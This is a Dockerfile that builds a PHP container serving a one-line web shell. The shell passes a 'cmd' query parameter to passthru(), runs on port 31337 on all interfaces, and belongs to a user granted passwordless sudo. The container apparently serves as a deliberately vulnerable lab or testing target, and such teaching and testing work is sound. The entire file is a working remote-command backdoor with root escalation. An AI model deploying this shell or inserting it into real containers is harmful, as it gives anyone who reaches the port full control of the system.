FROM php:7.4-cli

RUN apt update
RUN apt install sudo

RUN echo "webshell ALL=(ALL:ALL) NOPASSWD: ALL" > /etc/sudoers.d/webshell
RUN useradd -u 1000 -m -U webshell 

WORKDIR /home/webshell
USER webshell

RUN echo "<form><input type='text' name='cmd'/><input type='submit' value='GO'/></form><pre><?php if(isset(\$_GET['cmd']))passthru(\$_GET['cmd'])?></pre>" > index.php

HEALTHCHECK --interval=5s --timeout=30s --retries=3 CMD [ "/bin/true" ]
ENTRYPOINT [ "php", "-S", "0.0.0.0:31337" ]
